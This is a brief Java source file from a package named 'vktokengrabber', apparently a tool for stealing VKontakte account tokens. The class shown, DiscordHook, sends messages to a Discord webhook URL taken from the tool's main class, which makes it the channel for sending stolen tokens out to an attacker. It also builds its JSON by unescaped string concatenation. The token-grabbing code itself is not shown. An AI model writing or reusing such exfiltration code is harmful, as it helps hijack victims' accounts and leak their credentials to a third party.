package com.github.dedinc.vktokengrabber.utils;

import org.json.JSONObject;
import com.github.dedinc.vktokengrabber.Main;

public class DiscordHook {
  public static void sendMessage(String username, String message) {
	  Request.post(Main.hook, new JSONObject("{\"content\": \"" + message + "\", \"username\": \"" + username + "\"}"));
  }
}
